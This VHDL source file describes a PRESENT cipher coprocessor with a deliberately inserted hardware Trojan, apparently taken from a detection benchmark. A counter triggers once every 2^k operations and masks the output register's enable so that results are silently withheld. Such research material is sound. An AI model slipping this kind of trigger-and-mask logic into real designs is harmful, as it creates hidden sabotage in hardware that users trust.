library ieee;
use ieee.std_logic_1164.all;
use ieee.numeric_std.all;

-- Trojan 6: trigger = Timebomb which triggers after each 2^k encryption/decryption operations
-- payload = disallow the output register's enable signal (out_ena) from going high, thus
-- not permitting the computed data to be placed on the output data bus.

entity present_Trojan6 is
        generic (
                TROJAN_COUNTER_WIDTH : natural := 10
        );
        port (
                clk             : in std_logic;
                rst             : in std_logic;
                ena             : in std_logic;

                mode_sel        : in std_logic_vector(1 downto 0);
                key             : in std_logic_vector(127 downto 0);
                data_in         : in std_logic_vector(63 downto 0);
                data_out        : out std_logic_vector(63 downto 0);
                ready           : out std_logic
        );
end entity present_Trojan6;

architecture rtl of present_Trojan6 is
        signal  key_sched_out,
                key_mem_out : std_logic_vector(63 downto 0);

        signal  current_round,
                mem_address : std_logic_vector(4 downto 0);

        signal  enc_ena,
                dec_ena : std_logic;

        signal  mem_wr_ena : std_logic;

        signal  ciphertext,
                plaintext,
                mux_out : std_logic_vector(63 downto 0);

        signal  key_sched_ena,
                out_ena,
                load_ena : std_logic;

        signal  ready_cu : std_logic;
        
        constant TROJAN_COUNTER_MAX_VALUE : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0) := (others => '1');

        signal  trojan_trig,
                trojan_out_ena : std_logic;

        signal  trojan_counter_out : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0);
begin
        -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
        -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       

        control_unit : entity work.present_control_unit
                port map(
                        -- inputs
                        clk    => clk,
                        rst    => rst,
                        ena    => ena,
                        op_sel => mode_sel(0),

                        round_counter_val => current_round,
                        mem_addr          => mem_address,
                        mem_wr_ena        => mem_wr_ena,

                        enc_ena  => enc_ena,
                        dec_ena  => dec_ena,
                        load_ena => load_ena,

                        key_sched_ena => key_sched_ena,
                        out_ena       => out_ena,
                        ready         => ready_cu
                );

        key_sched : entity work.key_schedule_top
                port map(
                        clk               => clk,
                        rst               => rst,
                        ena               => key_sched_ena,
                        mode              => mode_sel(1),
                        input_key         => key,
                        output_key        => key_sched_out,
                        round_counter_val => current_round
                );

        round_key_mem : entity work.key_mem
                port map(
                        clk      => clk,
                        addr     => mem_address,
                        data_in  => key_sched_out,
                        wr_ena   => mem_wr_ena,
                        data_out => key_mem_out
                );

        enc_dp : entity work.present_enc
                port map(
                        clk        => clk,
                        rst        => rst,
                        ena        => enc_ena,
                        load_ena   => load_ena,
                        plaintext  => data_in,
                        round_key  => key_mem_out,
                        ciphertext => ciphertext
                );

        dec_dp : entity work.present_dec
                port map(
                        clk        => clk,
                        rst        => rst,
                        ena        => dec_ena,
                        load_ena   => load_ena,
                        ciphertext => data_in,
                        round_key  => key_mem_out,
                        plaintext  => plaintext
                );

        -- mux controlling the input of the output register. Depending on the value of mode_sel(0)
        -- (0 for encryption, 1 for decryption), pass the output of the corresponding datapath to 
        -- the output register's input.
        out_mux : entity work.mux
                generic map(
                        DATA_WIDTH => 64
                )
                port map(
                        input_A => ciphertext,
                        input_B => plaintext,
                        sel     => dec_ena,
                        mux_out => mux_out
                );

        -- trojan counter
        trojan_counter : entity work.counter
                generic map(
                        COUNTER_WIDTH => TROJAN_COUNTER_WIDTH
                )
                port map(
                        clk     => ready_cu,
                        cnt_ena => ena,
                        rst     => rst,
                        count   => trojan_counter_out
                );

        trojan_trig <= '1' when trojan_counter_out = TROJAN_COUNTER_MAX_VALUE else '0';
        
        trojan_out_ena <= out_ena AND NOT(trojan_trig);

        -- Coprocessor-global output register, in order to preserve the computed output data,
        -- until new ones are available. This can be helpful when a device reading from
        -- the coprocessor's output, reads with a rate less than the data output rate.
        out_reg : entity work.reg
                generic map(
                        DATA_WIDTH => 64
                )
                port map(
                        clk => clk,
                        ena => trojan_out_ena,
                        -- ena  => out_ena,
                        rst  => rst,
                        din  => mux_out,
                        dout => data_out
                );

        ready <= ready_cu;
end architecture;